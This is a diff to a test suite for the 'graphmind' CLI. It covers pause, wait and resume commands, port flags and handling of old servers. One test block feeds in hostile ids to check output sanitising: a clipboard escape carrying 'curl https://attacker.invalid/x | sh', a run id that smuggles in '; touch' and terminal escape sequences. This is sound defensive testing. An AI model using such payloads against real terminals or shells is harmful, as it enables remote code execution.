@@ -6,18 +6,20 @@
  */
 import { execFileSync, spawn, type ChildProcess } from 'node:child_process';
 import { existsSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
-import { createServer } from 'node:net';
+import { createServer as createHttpServer, type RequestListener, type Server as HttpServer } from 'node:http';
+import { createServer, type AddressInfo } from 'node:net';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { createSession, mergeToolInput, type GateDecision } from '@graphmind-ai/client';
 import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
 import { defaultFlags, parseCliArgs, type ParsedCli } from '../src/args.js';
-import { EXIT, INLINE_LIMIT, runPauses, runResume, runWait, type ControlIo } from '../src/commands/control.js';
+import { EXIT, INLINE_LIMIT, portFlag, runPauses, runResume, runWait, type ControlIo } from '../src/commands/control.js';
 import { SKILL_INSTALL_PATH, SKILL_SOURCE, runSkill } from '../src/commands/skill.js';
-import { packageRoot } from '../src/paths.js';
+import { DEFAULT_PORT, packageRoot } from '../src/paths.js';
 import type { ServerOptions } from '../src/server.js';
-import { heldApp, sleep } from './control-helpers.js';
-import { startTestServer, waitUntil, type TestServer } from './helpers.js';
+import { serveViewer } from '../src/static-site.js';
+import { ALL_CAPABILITIES, heldApp, sleep } from './control-helpers.js';
+import { FakeApp, startTestServer, waitUntil, type TestServer } from './helpers.js';
 
 const cleanups: (() => Promise<void> | void)[] = [];
 afterEach(async () => {
@@ -120,7 +122,7 @@ describe('graphmind pauses', () => {
     expect(text).toContain(agent.runId.slice(0, 24));
     expect(text).toContain('tool:search');
     expect(text).toContain('(editable)');
-    expect(text).toContain(`graphmind resume ${agent.pauseId} --run ${agent.runId} --action continue`);
+    expect(text).toContain(`graphmind resume ${agent.pauseId} --run ${agent.runId} --port ${ts.port} --action continue`);
     const json = capture(home);
     expect(await runPauses(cli(['pauses', '--json', '--run', agent.runId, '--port', String(ts.port)]), json.io)).toBe(EXIT.ok);
     const parsed = JSON.parse(json.out[0] as string) as { pauses: { pauseId: string; editable: boolean }[] };
@@ -148,7 +150,7 @@ describe('graphmind wait', () => {
     expect(text).toContain('tool:search (tool "search"), before the call');
     expect(text).toContain('editable  yes');
     expect(text).toContain('{"query":"lisbon","limit":5}');
-    expect(text).toContain(`graphmind resume ${agent.pauseId} --run ${agent.runId} --action continue --input @edited-input.json`);
+    expect(text).toContain(`graphmind resume ${agent.pauseId} --run ${agent.runId} --port ${ts.port} --action continue --input @edited-input.json`);
   });
 
   it('--json: compact, with large values written to a private temp file whose path is printed', async () => {
@@ -262,6 +264,42 @@ describe('graphmind resume', () => {
     await held.app.close();
   });
 
+  it('a retry right after its own --timeout ran out is "no answer yet" (exit 2), not "taken" (exit 7): nobody else resumed', async () => {
+    const { ts, home } = await boot({ allowControl: 'resume' });
+    const held = await heldApp(ts.port, { runId: 'r', pauseId: 'p1', answer: 'ignore' });
+    await waitUntil(() => ts.server.hub.listPauses().length === 1, 'held');
+    const args = ['resume', 'p1', '--run', 'r', '--action', 'continue', '--timeout', '1', '--port', String(ts.port)];
+    const first = capture(home);
+    expect(await runResume(cli(args), first.io)).toBe(EXIT.timeout);
+    expect(ts.server.hub.listPauses('r')[0]?.state).toBe('resolving');
+    const retry = capture(home);
+    expect(await runResume(cli(args), retry.io), retry.err.join('\n')).toBe(EXIT.timeout);
+    expect(retry.err.join('\n')).toContain('[still-resolving]');
+    expect(retry.err.join('\n')).not.toContain('another resume');
+    expect(held.resumes).toHaveLength(1);
+    await held.app.close();
+  });
+
+  it('an edit to a pause or app that cannot take one exits 6 (refused), not 5: raising --allow-control would not help', async () => {
+    const { ts, home } = await boot({ allowControl: 'edit' });
+    const legacy = await heldApp(ts.port, { runId: 'run-legacy', capabilities: ['pause', 'inject', 'retry', 'abort'], editable: true });
+    const plain = await heldApp(ts.port, { runId: 'run-plain', editable: false });
+    await waitUntil(() => ts.server.hub.listPauses().length === 2, 'two pauses');
+    for (const runId of ['run-legacy', 'run-plain']) {
+      const c = capture(home);
+      const code = await runResume(
+        cli(['resume', 'p1', '--run', runId, '--action', 'continue', '--input', '{"q":1}', '--port', String(ts.port)]),
+        c.io,
+      );
+      expect(code, `${runId}: ${c.err.join('\n')}`).toBe(EXIT.refused);
+      expect(c.err.join('\n')).toContain('[not-editable]');
+    }
+    expect(legacy.resumes).toEqual([]);
+    expect(plain.resumes).toEqual([]);
+    await legacy.app.close();
+    await plain.app.close();
+  });
+
   it('usage errors exit 1 without contacting the server', async () => {
     const home = tempDir('gm-');
     const cases: string[][] = [
@@ -278,6 +316,339 @@ describe('graphmind resume', () => {
       const c = capture(home);
       expect(await runResume(parseCliArgs(args), c.io), args.join(' ')).toBe(EXIT.usage);
     }
+  });
+});
+
+describe('suggested commands and printed text are safe (app-controlled ids)', () => {
+  // Any local process can write to /ingest without a credential, so run ids,
+  // pause ids, node ids and names, the app name and a smart hold's detail are
+  // untrusted text. Printed raw they drive the terminal; pasted raw into the
+  // suggested `graphmind resume` they run a second command.
+  const ESC = String.fromCharCode(0x1b);
+  const BEL = String.fromCharCode(0x07);
+  /** OSC 52: "set the clipboard to <base64>", which many terminals honour. */
+  const OSC52 = `${ESC}]52;c;${Buffer.from('curl https://attacker.invalid/x | sh').toString('base64')}${BEL}`;
+  /** C0 (except the line feed the CLI prints between lines), DEL, C1, bidi marks/overrides/isolates. */
+  const UNPRINTABLE_RANGES: readonly [number, number][] = [
+    [0x00, 0x09],
+    [0x0b, 0x1f],
+    [0x7f, 0x9f],
+    [0x200e, 0x200f],
+    [0x202a, 0x202e],
+    [0x2066, 0x2069],
+  ];
+  function expectPrintable(text: string, where: string): void {
+    const bad = [...text].filter((ch) => {
+      const code = ch.codePointAt(0) as number;
+      return UNPRINTABLE_RANGES.some(([from, to]) => code >= from && code <= to);
+    });
+    expect(bad.map((ch) => (ch.codePointAt(0) as number).toString(16)), `control characters in ${where}`).toEqual([]);
+  }
+
+  interface Hostile {
+    ts: TestServer;
+    home: string;
+    runId: string;
+    pauseId: string;
+    marker: string;
+    logs: string[];
+  }
+
+  async function hostilePause(): Promise<Hostile> {
+    const markerDir = tempDir('gm-hostile-marker-');
+    const marker = join(markerDir, 'gm-pwned');
+    const logs: string[] = [];
+    const { ts, home } = await boot({ log: (m: string) => logs.push(m) });
+    const runId = `r1 --action abort; touch ${marker}; #`;
+    const nodeId = `tool:x${OSC52}`;
+    const app = await FakeApp.connect(ts.port, {
+      app: `evil${ESC}]0;window title${BEL}${ESC}[2J`,
+      capabilities: ALL_CAPABILITIES,
+    });
+    cleanups.push(() => app.close());
+    app.send('run.started', runId, { app: 'evil-app', sdk: { name: 'test', version: '0.0.0' } });
+    app.send('node.started', runId, { nodeId, kind: 'tool', name: `search${OSC52}`, instanceId: 'i1', input: { query: 'lisbon' } });
+    app.send('exec.paused', runId, {
+      pauseId: 'p1',
+      nodeId,
+      point: 'before',
+      reason: 'breakpoint',
+      smart: { rule: 'error-result', detail: `the tool failed${ESC}[2J${ESC}[H` },
+    });
+    await waitUntil(() => ts.server.hub.listPauses(runId).length === 1, 'hostile pause open');
+    return { ts, home, runId, pauseId: 'p1', marker, logs };
+  }
+
+  /** Run a suggested command in a real POSIX shell with `graphmind` stubbed to print its argv. */
+  function runSuggested(command: string): string[] {
+    const script = `graphmind() { printf '%s\\n' "$@"; }\n${command}\n`;
+    return execFileSync('/bin/sh', ['-c', script], { encoding: 'utf8' })
+      .split('\n')
+      .filter((line) => line !== '');
+  }
+
+  function expectSafe(command: string, h: Hostile): void {
+    const argv = runSuggested(command);
+    expect(existsSync(h.marker), `running the suggested command executed the payload:\n  ${command}`).toBe(false);
+    expect(argv.slice(0, 4), `argv for: ${command}`).toEqual(['resume', h.pauseId, '--run', h.runId]);
+  }
+
+  it.skipIf(process.platform === 'win32')('`wait --json`: every next[] command passes the ids as single words and runs nothing else', async () => {
+    const h = await hostilePause();
+    const c = capture(h.home);
+    expect(await runWait(cli(['wait', '--json', '--port', String(h.ts.port), '--timeout', '5']), c.io)).toBe(EXIT.ok);
+    const out = JSON.parse(c.out[0] as string) as { pause: { runId: string }; next: string[] };
+    expect(out.pause.runId).toBe(h.runId);
+    expect(out.next.length).toBeGreaterThan(0);
+    for (const command of out.next) expectSafe(command, h);
+  });
+
+  it.skipIf(process.platform === 'win32')('`wait` (human): safe Next: commands, and no escape sequence reaches the terminal', async () => {
+    const h = await hostilePause();
+    const c = capture(h.home);
+    expect(await runWait(cli(['wait', '--port', String(h.ts.port), '--timeout', '5']), c.io)).toBe(EXIT.ok);
+    const text = c.out.join('\n');
+    expectPrintable(text, '`wait` output');
+    // The node id is still recognisable: its controls are shown, not dropped.
+    expect(text).toContain('tool:x\\u001b]52;c;');
+    const lines = text.split('\n');
+    const commands = lines.slice(lines.indexOf('Next:') + 1).map((line) => line.trim()).filter(Boolean);
+    expect(commands.length).toBeGreaterThan(0);
+    for (const command of commands) expectSafe(command, h);
+  });
+
+  it.skipIf(process.platform === 'win32')('`pauses` (human): safe hints, and no escape sequence reaches the terminal', async () => {
+    const h = await hostilePause();
+    const c = capture(h.home);
+    expect(await runPauses(cli(['pauses', '--port', String(h.ts.port)]), c.io)).toBe(EXIT.ok);
+    const text = c.out.join('\n');
+    expectPrintable(text, '`pauses` output');
+    const release = text.split('\n').find((line) => line.startsWith('Release it:'));
+    expect(release).toBeDefined();
+    expectSafe((release as string).slice('Release it:'.length).trim(), h);
+  });
+
+  it('an id with a control character gets no pasteable command at all', async () => {
+    const { ts, home } = await boot();
+    const runId = `run${ESC}[2Jx`;
+    const held = await heldApp(ts.port, { runId });
+    cleanups.push(() => held.app.close());
+    await waitUntil(() => ts.server.hub.listPauses(runId).length === 1, 'held');
+    const json = capture(home);
+    expect(await runWait(cli(['wait', '--json', '--port', String(ts.port), '--timeout', '5']), json.io)).toBe(EXIT.ok);
+    expect((JSON.parse(json.out[0] as string) as { next: string[] }).next).toEqual([]);
+    const human = capture(home);
+    expect(await runWait(cli(['wait', '--port', String(ts.port), '--timeout', '5']), human.io)).toBe(EXIT.ok);
+    const text = human.out.join('\n');
+    expectPrintable(text, '`wait` output');
+    expect(text).not.toContain('graphmind resume');
+    expect(text).toContain('control characters');
+  });
+
+  it('serve log: the app name is written without control characters', async () => {
+    const h = await hostilePause();
+    const attached = h.logs.filter((line) => line.startsWith('app attached'));
+    expect(attached.length).toBeGreaterThan(0);
+    for (const line of h.logs) expectPrintable(line, 'the serve log');
+  });
+});
+
+describe('suggested commands name the port they were asked about', () => {
+  it('wait --port N (json and human): every next command carries --port N, and running it verbatim resumes the pause', async () => {
+    const { ts, home } = await boot({ allowControl: 'resume' });
+    expect(ts.port).not.toBe(DEFAULT_PORT);
+    const held = await heldApp(ts.port, { runId: 'run-port', pauseId: 'pause-port', editable: true });
+    cleanups.push(() => held.app.close());
+    const json = capture(home);
+    expect(await runWait(cli(['wait', '--port', String(ts.port), '--json', '--timeout', '10']), json.io)).toBe(EXIT.ok);
+    const next = (JSON.parse(json.out[0] as string) as { next: string[] }).next;
+    expect(next.length).toBeGreaterThan(0);
+    for (const command of next) expect(command, command).toMatch(new RegExp(`--port ${ts.port}(\\s|$)`));
+    const human = capture(home);
+    expect(await runWait(cli(['wait', '--port', String(ts.port), '--timeout', '10']), human.io)).toBe(EXIT.ok);
+    const printed = human.out.join('\n').split('\n').filter((line) => line.trim().startsWith('graphmind resume '));
+    expect(printed.length).toBeGreaterThan(0);
+    for (const command of printed) expect(command).toContain(`--port ${ts.port}`);
+
+    // Run the printed continue exactly as given: it reaches the server holding the pause.
+    const continueCommand = next.find((command) => command.endsWith('--action continue')) as string;
+    const r = capture(home);
+    expect(await runResume(cli(continueCommand.split(/\s+/).slice(1)), r.io), r.err.join('\n')).toBe(EXIT.ok);
+    expect(held.resumes).toHaveLength(1);
+  });
+
+  it('pauses --port N: the "wait", "Inspect one" and "Release it" hints carry --port N; the default port adds nothing', async () => {
+    const { ts, home } = await boot();
+    const empty = capture(home);
+    expect(await runPauses(cli(['pauses', '--port', String(ts.port)]), empty.io)).toBe(EXIT.ok);
+    expect(empty.out.find((line) => line.startsWith('Block until one appears:'))).toContain(`graphmind wait --port ${ts.port}`);
+    const held = await heldApp(ts.port, { runId: 'run-port2', pauseId: 'pause-port2' });
+    cleanups.push(() => held.app.close());
+    await waitUntil(() => ts.server.hub.listPauses().length === 1, 'held');
+    const c = capture(home);
+    expect(await runPauses(cli(['pauses', '--port', String(ts.port)]), c.io)).toBe(EXIT.ok);
+    const lines = c.out.join('\n').split('\n');
+    expect(lines.find((line) => line.startsWith('Inspect one:'))).toContain(`graphmind wait --run run-port2 --port ${ts.port}`);
+    expect(lines.find((line) => line.startsWith('Release it:'))).toContain(
+      `graphmind resume pause-port2 --run run-port2 --port ${ts.port} --action continue`,
+    );
+    expect(portFlag(DEFAULT_PORT)).toBe('');
+  });
+});
+
+describe('against a server without the 0.6 control plane', () => {
+  // A 0.5.x `graphmind serve` has no /api/pauses: its router ends in
+  // `app.get('/*', serveViewer)` (v0.5.1 server.ts), and serveViewer's SPA
+  // fallback answers any extensionless GET — /api/pauses?wait=30 included —
+  // at once with 200 text/html. static-site.ts is unchanged since v0.5.1.
+  interface OtherServer {
+    port: number;
+    /** GET /api/pauses requests received so far. */
+    pausesHits(): number;
+    close(): Promise<void>;
+  }
+
+  async function listen(handler: RequestListener): Promise<OtherServer & { server: HttpServer }> {
+    let hits = 0;
+    const server = createHttpServer((req, res) => {
+      if ((req.url ?? '').startsWith('/api/pauses')) hits += 1;
+      handler(req, res);
+    });
+    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()));
+    let closed = false;
+    const close = async (): Promise<void> => {
+      if (closed) return;
+      closed = true;
+      server.closeAllConnections();
+      await new Promise<void>((resolve) => server.close(() => resolve()));
+    };
+    cleanups.push(close);
+    return { server, port: (server.address() as AddressInfo).port, pausesHits: () => hits, close };
+  }
+
+  /** The v0.5.1 routes: /health, /api/runs, then the real serveViewer for every other GET. */
+  async function server051(): Promise<OtherServer> {
+    const viewerDist = tempDir('graphmind-051-viewer-');
+    writeFileSync(join(viewerDist, 'index.html'), '<!doctype html><html><body><div id="root"></div></body></html>\n');
+    return await listen((req, res) => {
+      const url = new URL(req.url ?? '/', 'http://127.0.0.1');
+      if (url.pathname === '/health') {
+        res.writeHead(200, { 'content-type': 'application/json' });
+        res.end(JSON.stringify({ ok: true, name: 'graphmind-ai', version: '0.5.1' }));
+        return;
+      }
+      if (url.pathname === '/api/runs') {
+        res.writeHead(200, { 'content-type': 'application/json' });
+        res.end(JSON.stringify({ runs: [] }));
+        return;
+      }
+      if (req.method === 'GET') {
+        const response = serveViewer(`http://127.0.0.1${req.url ?? '/'}`, viewerDist);
+        void response.arrayBuffer().then((body) => {
+          res.writeHead(response.status, Object.fromEntries(response.headers.entries()));
+          res.end(Buffer.from(body));
+        });
+        return;
+      }
+      res.writeHead(404, { 'content-type': 'text/plain' });
+      res.end('404 Not Found');
+    });
+  }
+
+  it('precondition: the 0.5.1-shaped server answers GET /api/pauses?wait=30 at once with 200 text/html', async () => {
+    const old = await server051();
+    const started = Date.now();
+    const response = await fetch(`http://127.0.0.1:${old.port}/api/pauses?wait=30`);
+    expect(response.status).toBe(200);
+    expect(response.headers.get('content-type')).toMatch(/text\/html/);
+    expect(Date.now() - started).toBeLessThan(1_000);
+  });
+
+  it('control: a real 0.6 server long-polls — `wait --timeout 2` sends one or two requests', async () => {
+    const { ts, home } = await boot();
+    const realFetch = globalThis.fetch;
+    let hits = 0;
+    globalThis.fetch = ((input: Parameters<typeof fetch>[0], init?: RequestInit) => {
+      if (String(input).includes('/api/pauses')) hits += 1;
+      return realFetch(input, init);
+    }) as typeof fetch;
+    cleanups.push(() => {
+      globalThis.fetch = realFetch;
+    });
+    expect(await runWait(cli(['wait', '--port', String(ts.port), '--timeout', '2']), capture(home).io)).toBe(EXIT.timeout);
+    expect(hits).toBeLessThanOrEqual(2);
+  });
+
+  it('`pauses` (human and --json) says the server is too old and exits 3, never "No open pauses"', async () => {
+    const old = await server051();
+    const human = capture(tempDir('gm-'));
+    expect(await runPauses(cli(['pauses', '--port', String(old.port)]), human.io)).toBe(EXIT.unreachable);
+    expect(human.out.join('\n')).not.toMatch(/No open pauses/);
+    expect(human.err.join('\n')).toContain('0.5.1');
+    expect(human.err.join('\n')).toContain('0.6');
+    const json = capture(tempDir('gm-'));
+    expect(await runPauses(cli(['pauses', '--json', '--port', String(old.port)]), json.io)).toBe(EXIT.unreachable);
+    expect(json.out).toEqual([]);
+  });
+
+  it('`wait` does not hammer it: exit 3 after a request or two, with --timeout 2 and with --timeout 0', async () => {
+    const old = await server051();
+    const c = capture(tempDir('gm-'));
+    expect(await runWait(cli(['wait', '--port', String(old.port), '--timeout', '2']), c.io)).toBe(EXIT.unreachable);
+    expect(c.out.join('\n')).not.toMatch(/No pause within/);
+    expect(c.err.join('\n')).toContain('0.5.1');
+    expect(old.pausesHits()).toBeLessThanOrEqual(2);
+    const forever = capture(tempDir('gm-'));
+    const started = Date.now();
+    expect(await runWait(cli(['wait', '--port', String(old.port), '--timeout', '0']), forever.io)).toBe(EXIT.unreachable);
+    expect(Date.now() - started).toBeLessThan(3_000);
+  });
+
+  it('an unrelated service answering 200 text/plain is not an empty GraphMind server', async () => {
+    const other = await listen((_req, res) => {
+      res.writeHead(200, { 'content-type': 'text/plain' });
+      res.end('OK\n');
+    });
+    const p = capture(tempDir('gm-'));
+    expect(await runPauses(cli(['pauses', '--port', String(other.port)]), p.io)).toBe(EXIT.unreachable);
+    expect(p.err.join('\n')).toContain('not a GraphMind');
+    const w = capture(tempDir('gm-'));
+    expect(await runWait(cli(['wait', '--port', String(other.port), '--timeout', '1']), w.io)).toBe(EXIT.unreachable);
+    expect(other.pausesHits()).toBeLessThanOrEqual(3);
+  });
+
+  it('`wait` waits between polls when a server answers early without timedOut', async () => {
+    // Valid 0.6-shaped answers that do not long-poll (a proxy that buffers, a
+    // misbehaving server): the loop must never spin.
+    const eager = await listen((_req, res) => {
+      res.writeHead(200, { 'content-type': 'application/json' });
+      res.end(JSON.stringify({ pauses: [] }));
+    });
+    const c = capture(tempDir('gm-'));
+    expect(await runWait(cli(['wait', '--port', String(eager.port), '--timeout', '2']), c.io)).toBe(EXIT.timeout);
+    expect(eager.pausesHits()).toBeLessThanOrEqual(4);
+  });
+
+  it('`resume` with no server at all (clean exit removed the run file) exits 3, like pauses and wait', async () => {
+    const home = tempDir('gm-resume-home-');
+    const ts = await startTestServer({ runFile: true, env: { GRAPHMIND_HOME: home } });
+    const port = ts.port;
+    await ts.cleanup();
+    expect(existsSync(ts.server.runFilePath as string)).toBe(false);
+    const c = capture(home);
+    expect(await runResume(cli(['resume', 'p1', '--run', 'r', '--action', 'continue', '--port', String(port)]), c.io)).toBe(
+      EXIT.unreachable,
+    );
+    expect(c.err.join('\n')).toContain(`no GraphMind server on port ${port}`);
+  });
+
+  it('`resume` against a 0.5.x server (it writes no run file) says the server is too old and exits 3', async () => {
+    const old = await server051();
+    const c = capture(tempDir('gm-'));
+    expect(await runResume(cli(['resume', 'p1', '--run', 'r', '--action', 'continue', '--port', String(old.port)]), c.io)).toBe(
+      EXIT.unreachable,
+    );
+    expect(c.err.join('\n')).toContain('0.5.1');
   });
 });
 
